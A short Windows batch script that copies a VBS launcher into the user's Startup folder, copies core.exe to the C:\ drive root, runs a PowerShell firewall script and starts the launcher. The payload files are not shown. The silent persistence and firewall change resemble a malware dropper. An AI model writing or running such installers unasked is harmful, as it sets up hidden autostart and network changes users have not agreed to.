@echo off
cd /D %~dp0
set Core=%~dp0core.exe
set Start=%~dp0start.vbs

set StartupFolder=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
if exist "%StartupFolder%" goto :FoundStartup

set StartupFolder=%UserProfile%\Start Menu\Programs\Startup
if exist "%StartupFolder%" goto :FoundStartup

echo Cannot find Startup folder.
exit /B

:FoundStartup
copy %Start% "%StartupFolder%"
copy %Core% "C:\"

powershell -File %~dp0firewall.ps1

cd /D "C:\"
"%StartupFolder%\start.vbs"